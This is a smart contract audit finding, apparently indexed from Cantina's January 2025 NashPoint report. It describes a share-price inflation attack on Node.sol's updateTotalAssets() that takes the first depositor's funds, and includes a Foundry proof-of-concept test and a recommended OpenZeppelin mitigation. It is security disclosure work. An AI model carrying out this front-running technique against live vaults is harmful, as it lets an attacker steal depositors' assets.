---
# Core Classification
protocol: NashPoint
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 46047
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/16ca9765-fc97-471e-aece-ef52f5bbc877
source_link: https://cdn.cantina.xyz/reports/cantina_nashpoint_january_2025.pdf
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 3
finders:
  - Jonatas Martins
  - Kurt Barry
  - Gerard Persoon
---

## Vulnerability Title

Inﬂation attack to steal ﬁrst deposits 

### Overview

The report highlights a vulnerability in the updateTotalAssets() function in the Node.sol contract, which can be exploited by a malicious node owner to perform an inflation attack against initial depositors. This is because the function updates the contract's total assets and stores it in the cacheTotalAssets variable, allowing the owner to manipulate the share price and receive more shares than they are entitled to.

The proof of concept provided in the report demonstrates how this attack can be carried out, and recommends implementing the OZ standard solution to prevent price manipulation. It also notes that simply removing the updateTotalAssets() function will not solve the issue, as the owner can achieve the same effect by calling payManagementFees().

The bug has been acknowledged by both NashPoint and Cantina Managed.

### Original Finding Content

## Vulnerability Report for Node.sol

## Context
Node.sol#L347-L349

## Description
The `updateTotalAssets()` function, callable by the owner or rebalancer, can be exploited to perform an inflation attack against initial depositors. This vulnerability exists because the function updates the contract's total assets and stores it in the `cacheTotalAssets` variable. A malicious node owner can front-run the first deposit through these steps:

1. Deposit 1 asset and mint 1 share.
2. Transfer assets directly to the node.
3. Call `updateTotalAssets()` to update the `cacheTotalAssets`.

Consequently, when the first legitimate depositor calls `deposit()`, they receive 0 shares because the share price has been artificially inflated.

## Proof of Concept
Using the test/unit/Node.t.sol as reference.

```solidity
function test_inflationAttack() public {
    uint256 assets = 100e18;
    deal(address(asset), address(user), assets);
    deal(address(asset), address(owner), 3 * assets);
    
    //@audit Front-run the first deposit
    vm.startPrank(owner);
    asset.approve(address(node), 1);
    node.deposit(1, owner);
    asset.transfer(address(node), 2 * assets);
    node.updateTotalAssets();
    vm.stopPrank();
    
    vm.startPrank(user);
    asset.approve(address(node), assets);
    node.deposit(assets, user);
    vm.stopPrank();
    
    //@audit The owner still have 1 share and the user didn't get any share
    assertEq(node.balanceOf(owner), 1);
    assertEq(node.balanceOf(user), 0);
}
```

## Recommendation
Consider implementing the OZ standard solution, which requires depositing a non-trivial amount of assets to make price manipulation infeasible. See ERC4626.sol#L22-L28. Note that removing `updateTotalAssets()` won't resolve this issue, as the owner can achieve the same effect by calling `payManagementFees()`.

## NashPoint
Acknowledged.

## Cantina Managed
Acknowledged.

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | NashPoint |
| Report Date | N/A |
| Finders | Jonatas Martins, Kurt Barry, Gerard Persoon |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_nashpoint_january_2025.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/16ca9765-fc97-471e-aece-ef52f5bbc877

### Keywords for Search

`vulnerability`

